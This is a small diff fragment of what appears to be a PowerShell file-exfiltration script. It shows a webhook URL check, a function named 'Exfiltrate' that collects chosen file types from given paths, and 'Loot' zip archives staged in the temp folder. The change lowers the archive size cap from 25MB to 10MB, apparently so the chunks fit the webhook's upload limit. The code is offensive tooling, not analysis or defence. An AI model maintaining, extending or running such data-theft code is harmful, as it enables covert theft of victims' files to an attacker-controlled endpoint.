@@ -7,7 +7,7 @@ if ($hookurl.Ln -ne 121){Write-Host "Shortened Webhook URL Detected.." ; $hookur
 Function Exfiltrate {
 
 param ([string[]]$FileType,[string[]]$Path)
-$maxZipFileSize = 25MB
+$maxZipFileSize = 10MB
 $currentZipSize = 0
 $index = 1
 $zipFilePath ="$env:temp/Loot$index.zip"
